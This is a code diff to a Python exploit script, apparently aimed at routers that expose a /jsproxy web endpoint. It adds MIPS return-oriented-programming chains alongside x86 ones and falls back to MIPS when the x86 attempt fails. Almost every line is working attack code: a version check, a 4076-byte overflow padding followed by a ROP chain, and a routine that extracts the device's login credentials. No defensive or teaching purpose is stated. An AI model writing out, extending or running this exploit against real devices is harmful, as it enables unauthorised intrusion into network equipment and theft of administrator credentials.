@@ -26,7 +26,9 @@ class Vuln():
 		self.port=port
 		self.version=self.get_version()
 		self.vulnerable=self.check_vulnerable()
-		self.ropChain=self.get_rop()
+		self.ropChain86=self.get_rop_x86()
+		self.ropChainmips=self.get_rop_mips()
+		self.ismips=False
 	def get_version(self):
 		resp = requests.get('http://%s:%s'%(self.ip,self.port))
 		response = resp.content.decode('utf-8','ignore')
@@ -43,13 +45,25 @@ class Vuln():
 		if int(router_version)>63840:
 			return False
 		return True
-	def get_rop(self):
+	def get_rop_x86(self):
 		ropfile=open('x86ropchains','rb').read()
 		ropindexes,ropchains=ropfile.split(b'\n\n')
 		ropindexes=ropindexes.split(b',')
 		if self.version in ropindexes:
 			rop_offset=ropindexes.index(bytes(self.version))*932
 			ropchain=ropchains[rop_offset:rop_offset+932]
+			return ropchain
+		else:
+			print_e("I may have skipped that one")
+	def get_rop_mips(self):
+		ropfile=open('mipsropchains','rb').read()
+		ropindexes,ropchains=ropfile.split(b'\n\n')
+		ropindexes=ropindexes.split(b',')
+		ropsplitted=dict(zip(map(lambda x: x.split('|')[0],ropindexes),map(lambda x: x.split('|')[1:],ropindexes)))
+		if self.version in ropsplitted:
+			rop_offset=int(ropsplitted[self.version][0])
+			ropend=int(ropsplitted[self.version][1])
+			ropchain=ropchains[rop_offset:rop_offset+ropend]
 			return ropchain
 		else:
 			print_e("I may have skipped that one")
@@ -116,11 +130,20 @@ class Vuln():
 			self.send_data(s1,"POST /jsproxy HTTP/1.1\r\nContent-Length: %s\r\n\r\n"%stack_size)
 			self.send_data(s1,b'A'*(4076))
 			self.send_data(s2,"POST /jsproxy HTTP/1.1\r\nContent-Length: 32768\r\n\r\n")
-			self.send_data(s1,self.ropChain)
+			self.send_data(s1,self.ropChainmips if self.ismips else self.ropChain86)
 			s2.close()
 			sleep(2.5)
-			self.extract_login()
-			self.celebrate()
+			try:
+				self.extract_login()
+				self.celebrate()
+			except:
+				print_w("Mips exploitation also failed.. Exiting" if self.ismips else "Failed to exploit with x86 config...Trying mips.")
+				if self.ismips:
+					sys.exit()
+				self.ismips = True
+				s1.close()
+				sleep(2.5)
+				self.exploit()
 		else:
 			print_e("How can I attack a target that is not vulnerable?")
 if __name__ == "__main__":
